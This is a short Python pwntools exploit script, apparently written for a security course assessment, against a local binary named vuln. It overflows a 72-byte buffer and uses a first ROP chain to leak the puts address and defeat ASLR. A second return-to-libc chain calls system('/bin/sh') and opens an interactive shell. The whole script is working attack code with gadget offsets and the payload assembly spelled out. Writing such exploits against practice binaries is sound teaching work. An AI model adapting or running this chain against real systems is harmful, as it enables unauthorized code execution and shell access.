# Python program to exploit vuln.c for Assessment 2

#!/usr/bin/python3

from pwn import *
from struct import pack

p = process('./vuln') 

program = ELF('./vuln')
context.binary = program
#libc = program.libc
rop = ROP(program)

#ASLR - leak address
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')   #Unknown in ASLR
rop.raw(b"A" * 72)
rop.puts(program.got['puts'])

rop.call(0x40140a) # main function
print(rop.dump())

p.recvuntil("Password:") 
p.sendline(rop.chain())

leakedPuts = p.recvline()[:8].strip()
print("Leaked puts@GLIBC: {}".format(leakedPuts))
      
leakedPuts = int.from_bytes(leakedPuts, byteorder='little')
libc.address = leakedPuts - libc.symbols['puts']

#libc.address = 0x00007ffff7dc4000 # Libc base address on my system without ASLR.
poprdi = libc.address + 0x0000000000028215 # using ROPgadget - need RDI as it is first register needed in 64bit.
ret = libc.address + 0x000000000002668c # using ROPgadget
system = libc.address + 0x000000000004dab0 # using 'readelf'
binsh = libc.address + 0x0000000000197e34 # using 'strings'

rop.raw(b"A"*72)  # trigger the buffer overflow
#rop.raw(pack("I",0xdeadbeef)) # RIP test
rop.raw(poprdi) # pop rdi
rop.raw(binsh)
##rop.raw(next(libc.search(b'/bin/sh')))  # ROPgadget - search for the string /bin/sh
rop.raw(ret)  # ret from libc
rop.raw(system)
##rop.raw(libc.symbols['system']) # ROPgadget - find the 'system' symbol

p.recvuntil(b"Password:") 

# Generate the ROP chain
rop_chain = rop.chain()

# Write the ROP chain to a file - to use with debugger
with open('rop_chain_ASLR.txt', 'wb') as f:
    f.write(rop_chain)

p.sendline(rop_chain) # Send the exploit to ./vuln
p.interactive() # Begin interactive session